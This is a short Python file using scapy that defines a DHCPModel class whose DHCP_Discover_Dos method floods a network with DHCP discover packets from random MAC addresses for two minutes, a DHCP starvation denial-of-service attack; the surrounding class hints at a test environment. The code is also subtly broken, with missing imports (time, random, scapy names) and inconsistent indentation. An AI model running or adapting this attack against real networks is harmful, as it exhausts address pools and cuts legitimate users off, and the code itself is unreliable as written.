import logging
import scapy
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

class DHCPModel:

    env = None;

    def __init__(self,Environement):
        self.env = Environement
        conf.verb = 0
        conf.checkIpAddr = False

    def DHCP_Discover_Dos(self):
    	#run this for 2mins after stop
    	t_end = time.time() + 60 * 2
		while time.time() < t_end:
    		#randomize fields
    		hostname = RandString(12,'0123456789abcdef')
	        m = RandMAC()
	        transid = random.randint(0,0xFFFFFFFF)

	        #craft discover dhcp
	        tramedhcp = Ether(src=m,dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(xid=transid,chaddr=hostname)/DHCP(options=[("message-type","discover"),"end"])
	        
	        #send
	        sendp(tramedhcp)
